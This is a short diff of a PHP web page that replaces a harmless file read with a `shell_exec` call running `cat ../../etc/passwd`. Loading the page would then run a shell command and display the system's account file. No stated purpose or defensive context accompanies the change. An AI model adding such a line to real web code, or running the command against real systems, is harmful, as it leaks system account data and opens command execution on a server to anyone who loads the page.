@@ -3,7 +3,7 @@
   </header>
   <body>		
      <?php
-	 file_get_contents("index.php");
+	 shell_exec("cat ../../etc/passwd");
      ?>
   </body>
 <html>
